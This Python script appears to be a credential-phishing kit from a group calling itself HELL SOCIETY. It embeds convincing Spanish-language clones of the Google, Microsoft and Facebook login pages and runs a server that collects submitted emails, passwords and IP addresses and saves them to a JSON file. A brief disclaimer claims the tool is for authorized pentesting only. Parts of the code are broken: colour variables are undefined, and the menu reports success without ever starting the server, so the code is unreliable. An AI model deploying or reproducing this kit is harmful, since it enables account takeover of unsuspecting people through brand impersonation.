#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  PHISHING FRAMEWORK v2.0                                         ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Social Engineering                        ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import sys
import os
import colorama
from colorama import Fore, Back, Style
import argparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import json
import base64
from datetime import datetime

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

TEMPLATES = {
    'google': {
        'name': 'Google Login',
        'title': 'Iniciar sesión - Cuentas de Google',
        'html': '''<!DOCTYPE html>
<html>
<head><title>Iniciar sesión - Cuentas de Google</title>
<style>
body{font-family:Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#fff}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:450px}
.logo{margin-bottom:16px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;font-weight:400;margin:0 0 8px}
.subtitle{color:#202124;font-size:16px;margin:0 0 32px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:0 0 8px;box-sizing:border-box}
input:focus{border:2px solid #1a73e8;outline:none;padding:12px 14px}
.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}
.btn:hover{background:#1557b0}
</style></head>
<body><div class="card">
<div class="logo"><svg viewBox="0 0 272 92"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/><path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#EA4335" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg></div>
<h1>Inicia sesión</h1>
<p class="subtitle">Usa tu cuenta de Google</p>
<form action="/capture" method="POST" id="loginForm">
<input type="text" name="email" id="email" placeholder="Correo electrónico o teléfono" required>
<input type="password" name="password" id="password" placeholder="Introduce tu contraseña" required>
<button type="submit" class="btn">Siguiente</button>
</form></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();var f=new FormData(this);fetch('/capture',{method:'POST',body:f}).then(function(){window.location='/thankyou'})})</script>
</body></html>'''
    },
    'microsoft': {
        'name': 'Microsoft Login',
        'title': 'Iniciar sesión en su cuenta',
        'html': '''<!DOCTYPE html>
<html>
<head><title>Iniciar sesión en su cuenta</title>
<style>
body{font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f2f2f2}
.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.3);padding:44px;width:440px}
.logo{margin-bottom:16px}
h2{font-size:24px;font-weight:600;margin:0 0 16px;color:#1b1b1b}
input{width:100%;padding:6px 10px;border:none;border-bottom:2px solid #0067b8;font-size:15px;margin:0 0 24px;box-sizing:border-box;background:transparent}
input:focus{border-bottom:2px solid #0067b8;outline:none}
.btn{background:#0067b8;color:#fff;border:none;padding:6px 32px;font-size:15px;cursor:pointer;float:right}
.btn:hover{background:#005a9e}
</style></head>
<body><div class="card">
<div class="logo"><svg width="108" height="23"><rect fill="#f25022" width="11" height="11"/><rect fill="#7fba00" x="12" width="11" height="11"/><rect fill="#00a4ef" y="12" width="11" height="11"/><rect fill="#ffb900" x="12" y="12" width="11" height="11"/></svg></div>
<h2>Iniciar sesión</h2>
<form action="/capture" method="POST" id="loginForm">
<input type="text" name="email" placeholder="Correo electrónico, teléfono o Skype" required>
<input type="password" name="password" placeholder="Contraseña" required>
<button type="submit" class="btn">Iniciar sesión</button>
</form></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();var f=new FormData(this);fetch('/capture',{method:'POST',body:f}).then(function(){window.location='/thankyou'})})</script>
</body></html>'''
    },
    'facebook': {
        'name': 'Facebook Login',
        'title': 'Facebook - Inicia sesión o regístrate',
        'html': '''<!DOCTYPE html>
<html>
<head><title>Facebook - Inicia sesión</title>
<style>
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;margin:0;display:flex;flex-direction:column;align-items:center;padding-top:72px}
.container{display:flex;gap:32px;max-width:980px}
.left{flex:1;padding:100px 0 0}
.left h1{color:#1877f2;font-size:56px;margin:0}
.left p{font-size:28px;color:#1c1e21}
.right{width:396px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin:0 0 12px;box-sizing:border-box}
input:focus{border:1px solid #1877f2;outline:none}
.btn{background:#1877f2;color:#fff;border:none;padding:12px;width:100%;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
.btn:hover{background:#166fe5}
</style></head>
<body><div class="container">
<div class="left"><h1>facebook</h1><p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p></div>
<div class="right"><div class="card">
<form action="/capture" method="POST" id="loginForm">
<input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
<input type="password" name="password" placeholder="Contraseña" required>
<button type="submit" class="btn">Iniciar sesión</button>
</form></div></div></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();var f=new FormData(this);fetch('/capture',{method:'POST',body:f}).then(function(){window.location='/thankyou'})})</script>
</body></html>'''
    }
}

class PhishingServer:
    def __init__(self, template, port=8080):
        self.template = template
        self.port = port
        self.captured = []
        self.server = None

    def start(self):
        template_data = TEMPLATES.get(self.template)
        if not template_data:
            print(f"{Fore.RED}  [!] Template not found. Available: {list(TEMPLATES.keys())}")
            return

        html_content = template_data['html']
        print(f"{Fore.CYAN}  [*] Template: {Fore.WHITE}{template_data['name']}")
        print(f"{Fore.CYAN}  [*] Port: {Fore.WHITE}{self.port}")
        print(f"{Fore.CYAN}  [*] Starting phishing server...\n")

        class Handler(SimpleHTTPRequestHandler):
            captured_data = self.captured
            page_html = html_content

            def do_GET(self):
                if self.path == '/' or self.path == '/login':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(self.page_html.encode())
                elif self.path == '/thankyou':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<html><body><h1>Verificando identidad...</h1><p>Por favor espere.</p></body></html>')
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                if self.path == '/capture':
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length).decode()
                    params = dict(x.split('=') for x in body.split('&') if '=' in x)

                    self.captured_data.append({
                        'email': params.get('email', ''),
                        'password': params.get('password', ''),
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'ip': self.client_address[0]
                    })

                    print(f"\n  {Fore.GREEN}[+] CREDENTIALS CAPTURED!")
                    print(f"  {Fore.GREEN}  Email: {Fore.WHITE}{params.get('email', 'N/A')}")
                    print(f"  {Fore.GREEN}  Password: {Fore.WHITE}{params.get('password', 'N/A')}")
                    print(f"  {Fore.GREEN}  IP: {Fore.WHITE}{self.client_address[0]}")
                    print(f"  {Fore.GREEN}  Time: {Fore.WHITE}{params.get('timestamp', 'N/A')}")

                    self.send_response(302)
                    self.send_header('Location', '/thankyou')
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, format, *args):
                print(f"  {Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")

        self.server = HTTPServer(('0.0.0.0', self.port), Handler)
        print(f"  {Fore.GREEN}  [+] Server running on: {Fore.WHITE}http://0.0.0.0:{self.port}")
        print(f"  {Fore.GREEN}  [+] Local: {Fore.WHITE}http://localhost:{self.port}")
        print(f"  {Fore.YELLOW}  [!] Waiting for victims...\n")

        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            print(f"\n\n  {Fore.CYAN}  [+] Server stopped")
            self.save_results()

    def save_results(self):
        if self.captured:
            filename = f"captured_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(self.captured, f, indent=2)
            print(f"  {Fore.GREEN}  [+] Results saved to: {filename}")



def ask_retry():
    print()
    print(f"  {Y}{'='*50}{RS}")
    print(f"  {C}[1] {BW}Usar esta herramienta de nuevo{RS}")
    print(f"  {C}[2] {BW}Volver al panel principal{RS}")
    print(f"  {R}[0] {BW}Salir{RS}")
    print(f"  {Y}{'='*50}{RS}")
    try:
        ch = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        if ch == '1':
            return 'retry'
        elif ch in ['2', '0']:
            return 'exit'
        else:
            return 'retry'
    except (EOFError, KeyboardInterrupt):
        return 'exit'

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    print()
    print(f"  {BW}{Style.BRIGHT}  PHISHING FRAMEWORK{RS}")
    print(f"  {Y}{Style.BRIGHT}  HELL SOCIETY Community{RS}")
    print()
    while True:
        print(f"  {G}╔╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╗{RS}")
        print(f"  {G}╟  {BW}PHISHING FRAMEWORK                      {RS}  {G}╟{RS}")
        print(f"  {G}╚╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╝{RS}")
        print()
        print(f"  {C}[1]  {BW}Server port                                  {RS}")
        print()
        print(f"  {C}[2]  {BW}Ejecutar con todos los argumentos{RS}")
        print()
        print(f"  {R}[0]  {BW}Exit{RS}")
        print()
        try:
            choice = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {R}[*] Goodbye...{RS}")
            sys.exit(0)
        print()
        if choice == '1':
            print(f"  {Y}[*] Server port{RS}")
            value = input(f"  {Y}[*] -p: {RS}").strip()
            print(f"  {C}[*] Executing with -p={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '2':
            print(f"  {Y}[*] Executing with all default parameters{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '0':
            print(f"  {Y}[*] Goodbye from Hell Society...{RS}")
            sys.exit(0)
        else:
            print(f"  {R}[!] Invalid option. Choose 0-3.{RS}")
        ch = ask_retry()
        if ch == 'exit':
            sys.exit(0)
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(BANNER)
            print()

if __name__ == "__main__":
    main()

